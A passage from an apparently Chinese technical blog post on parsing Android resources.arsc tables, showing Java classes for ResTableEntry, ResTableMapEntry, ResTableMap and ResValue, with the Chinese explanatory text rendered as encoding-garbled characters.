&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResTableEntry&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">FLAG_COMPLEX&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x0001&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">FLAG_PUBLIC&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x0002&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">short&lt;/span> &lt;span class="n">size&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">short&lt;/span> &lt;span class="n">flags&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResStringPoolRef&lt;/span> &lt;span class="n">key&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResTableEntry&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">key&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResStringPoolRef&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">2&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getSize&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s">&amp;#34;size:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">size&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,flags:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">flags&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="s">&amp;#34;,key:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;,str:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">ParseResourceUtils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getKeyString&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">key&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">index&lt;/span>&lt;span class="o">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ResTable_entryæ ¹æ®flagsçš„ä¸åŒ,åé¢è·Ÿéšçš„æ•°æ®ä¹Ÿä¸ç›¸åŒ,å¦‚æœflagsæ­¤ä½ä¸º1,åˆ™ResTable_entryæ˜¯ResTable_map_entry,ResTable_map_entryç»§æ‰¿è‡ªResTable_entry,å…¶ç»“æ„å¦‚ä¸‹ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResTableMapEntry&lt;/span> &lt;span class="kd">extends&lt;/span> &lt;span class="n">ResTableEntry&lt;/span>&lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResTableRef&lt;/span> &lt;span class="n">parent&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResTableMapEntry&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResTableRef&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">super&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getSize&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getSize&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">4&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="kd">super&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34;,parent:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">parent&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;,count:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">count&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ResTable_map_entryå…¶åè·Ÿéšåˆ™countä¸ªResTable_mapç±»å‹çš„æ•°ç»„,ResTable_mapçš„ç»“æ„å¦‚ä¸‹ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nn">com.wjdiankong.parseresource.type&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> struct ResTable_map
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> {
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> //bagèµ„æºé¡¹ID
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> ResTable_ref name;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> //bagèµ„æºé¡¹å€¼
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> Res_value value;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> };
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> * @author i
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cm"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResTableMap&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResTableRef&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">ResValue&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="nf">ResTableMap&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">name&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResTableRef&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ResValue&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">getSize&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getSize&lt;/span>&lt;span class="o">()&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getSize&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nd">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="nf">toString&lt;/span>&lt;span class="o">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">()+&lt;/span>&lt;span class="s">&amp;#34;,value:&amp;#34;&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">toString&lt;/span>&lt;span class="o">();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚æœflagsæ­¤ä½ä¸º0,åˆ™ResTable_entryå…¶åè·Ÿéšçš„æ˜¯ä¸€ä¸ªRes_value,æè¿°ä¸€ä¸ªæ™®é€šèµ„æºçš„å€¼,Res_valueç»“æ„å¦‚ä¸‹ã€‚&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt"> 10
&lt;/span>&lt;span class="lnt"> 11
&lt;/span>&lt;span class="lnt"> 12
&lt;/span>&lt;span class="lnt"> 13
&lt;/span>&lt;span class="lnt"> 14
&lt;/span>&lt;span class="lnt"> 15
&lt;/span>&lt;span class="lnt"> 16
&lt;/span>&lt;span class="lnt"> 17
&lt;/span>&lt;span class="lnt"> 18
&lt;/span>&lt;span class="lnt"> 19
&lt;/span>&lt;span class="lnt"> 20
&lt;/span>&lt;span class="lnt"> 21
&lt;/span>&lt;span class="lnt"> 22
&lt;/span>&lt;span class="lnt"> 23
&lt;/span>&lt;span class="lnt"> 24
&lt;/span>&lt;span class="lnt"> 25
&lt;/span>&lt;span class="lnt"> 26
&lt;/span>&lt;span class="lnt"> 27
&lt;/span>&lt;span class="lnt"> 28
&lt;/span>&lt;span class="lnt"> 29
&lt;/span>&lt;span class="lnt"> 30
&lt;/span>&lt;span class="lnt"> 31
&lt;/span>&lt;span class="lnt"> 32
&lt;/span>&lt;span class="lnt"> 33
&lt;/span>&lt;span class="lnt"> 34
&lt;/span>&lt;span class="lnt"> 35
&lt;/span>&lt;span class="lnt"> 36
&lt;/span>&lt;span class="lnt"> 37
&lt;/span>&lt;span class="lnt"> 38
&lt;/span>&lt;span class="lnt"> 39
&lt;/span>&lt;span class="lnt"> 40
&lt;/span>&lt;span class="lnt"> 41
&lt;/span>&lt;span class="lnt"> 42
&lt;/span>&lt;span class="lnt"> 43
&lt;/span>&lt;span class="lnt"> 44
&lt;/span>&lt;span class="lnt"> 45
&lt;/span>&lt;span class="lnt"> 46
&lt;/span>&lt;span class="lnt"> 47
&lt;/span>&lt;span class="lnt"> 48
&lt;/span>&lt;span class="lnt"> 49
&lt;/span>&lt;span class="lnt"> 50
&lt;/span>&lt;span class="lnt"> 51
&lt;/span>&lt;span class="lnt"> 52
&lt;/span>&lt;span class="lnt"> 53
&lt;/span>&lt;span class="lnt"> 54
&lt;/span>&lt;span class="lnt"> 55
&lt;/span>&lt;span class="lnt"> 56
&lt;/span>&lt;span class="lnt"> 57
&lt;/span>&lt;span class="lnt"> 58
&lt;/span>&lt;span class="lnt"> 59
&lt;/span>&lt;span class="lnt"> 60
&lt;/span>&lt;span class="lnt"> 61
&lt;/span>&lt;span class="lnt"> 62
&lt;/span>&lt;span class="lnt"> 63
&lt;/span>&lt;span class="lnt"> 64
&lt;/span>&lt;span class="lnt"> 65
&lt;/span>&lt;span class="lnt"> 66
&lt;/span>&lt;span class="lnt"> 67
&lt;/span>&lt;span class="lnt"> 68
&lt;/span>&lt;span class="lnt"> 69
&lt;/span>&lt;span class="lnt"> 70
&lt;/span>&lt;span class="lnt"> 71
&lt;/span>&lt;span class="lnt"> 72
&lt;/span>&lt;span class="lnt"> 73
&lt;/span>&lt;span class="lnt"> 74
&lt;/span>&lt;span class="lnt"> 75
&lt;/span>&lt;span class="lnt"> 76
&lt;/span>&lt;span class="lnt"> 77
&lt;/span>&lt;span class="lnt"> 78
&lt;/span>&lt;span class="lnt"> 79
&lt;/span>&lt;span class="lnt"> 80
&lt;/span>&lt;span class="lnt"> 81
&lt;/span>&lt;span class="lnt"> 82
&lt;/span>&lt;span class="lnt"> 83
&lt;/span>&lt;span class="lnt"> 84
&lt;/span>&lt;span class="lnt"> 85
&lt;/span>&lt;span class="lnt"> 86
&lt;/span>&lt;span class="lnt"> 87
&lt;/span>&lt;span class="lnt"> 88
&lt;/span>&lt;span class="lnt"> 89
&lt;/span>&lt;span class="lnt"> 90
&lt;/span>&lt;span class="lnt"> 91
&lt;/span>&lt;span class="lnt"> 92
&lt;/span>&lt;span class="lnt"> 93
&lt;/span>&lt;span class="lnt"> 94
&lt;/span>&lt;span class="lnt"> 95
&lt;/span>&lt;span class="lnt"> 96
&lt;/span>&lt;span class="lnt"> 97
&lt;/span>&lt;span class="lnt"> 98
&lt;/span>&lt;span class="lnt"> 99
&lt;/span>&lt;span class="lnt">100
&lt;/span>&lt;span class="lnt">101
&lt;/span>&lt;span class="lnt">102
&lt;/span>&lt;span class="lnt">103
&lt;/span>&lt;span class="lnt">104
&lt;/span>&lt;span class="lnt">105
&lt;/span>&lt;span class="lnt">106
&lt;/span>&lt;span class="lnt">107
&lt;/span>&lt;span class="lnt">108
&lt;/span>&lt;span class="lnt">109
&lt;/span>&lt;span class="lnt">110
&lt;/span>&lt;span class="lnt">111
&lt;/span>&lt;span class="lnt">112
&lt;/span>&lt;span class="lnt">113
&lt;/span>&lt;span class="lnt">114
&lt;/span>&lt;span class="lnt">115
&lt;/span>&lt;span class="lnt">116
&lt;/span>&lt;span class="lnt">117
&lt;/span>&lt;span class="lnt">118
&lt;/span>&lt;span class="lnt">119
&lt;/span>&lt;span class="lnt">120
&lt;/span>&lt;span class="lnt">121
&lt;/span>&lt;span class="lnt">122
&lt;/span>&lt;span class="lnt">123
&lt;/span>&lt;span class="lnt">124
&lt;/span>&lt;span class="lnt">125
&lt;/span>&lt;span class="lnt">126
&lt;/span>&lt;span class="lnt">127
&lt;/span>&lt;span class="lnt">128
&lt;/span>&lt;span class="lnt">129
&lt;/span>&lt;span class="lnt">130
&lt;/span>&lt;span class="lnt">131
&lt;/span>&lt;span class="lnt">132
&lt;/span>&lt;span class="lnt">133
&lt;/span>&lt;span class="lnt">134
&lt;/span>&lt;span class="lnt">135
&lt;/span>&lt;span class="lnt">136
&lt;/span>&lt;span class="lnt">137
&lt;/span>&lt;span class="lnt">138
&lt;/span>&lt;span class="lnt">139
&lt;/span>&lt;span class="lnt">140
&lt;/span>&lt;span class="lnt">141
&lt;/span>&lt;span class="lnt">142
&lt;/span>&lt;span class="lnt">143
&lt;/span>&lt;span class="lnt">144
&lt;/span>&lt;span class="lnt">145
&lt;/span>&lt;span class="lnt">146
&lt;/span>&lt;span class="lnt">147
&lt;/span>&lt;span class="lnt">148
&lt;/span>&lt;span class="lnt">149
&lt;/span>&lt;span class="lnt">150
&lt;/span>&lt;span class="lnt">151
&lt;/span>&lt;span class="lnt">152
&lt;/span>&lt;span class="lnt">153
&lt;/span>&lt;span class="lnt">154
&lt;/span>&lt;span class="lnt">155
&lt;/span>&lt;span class="lnt">156
&lt;/span>&lt;span class="lnt">157
&lt;/span>&lt;span class="lnt">158
&lt;/span>&lt;span class="lnt">159
&lt;/span>&lt;span class="lnt">160
&lt;/span>&lt;span class="lnt">161
&lt;/span>&lt;span class="lnt">162
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kd">class&lt;/span> &lt;span class="nc">ResValue&lt;/span> &lt;span class="o">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">//dataTypeå­—æ®µä½¿ç”¨çš„å¸¸é‡
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_NULL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x00&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_REFERENCE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x01&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_ATTRIBUTE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x02&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_STRING&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x03&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_FLOAT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x04&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_DIMENSION&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x05&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_FRACTION&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x06&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_FIRST_INT&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x10&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_INT_DEC&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x10&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_INT_HEX&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x11&lt;/span>&lt;span class="o">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">public&lt;/span> &lt;span class="kd">final&lt;/span> &lt;span class="kd">static&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="n">TYPE_INT_BOOLEAN&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">0x12&lt;/span>&lt;span class="o">;&lt;/span>
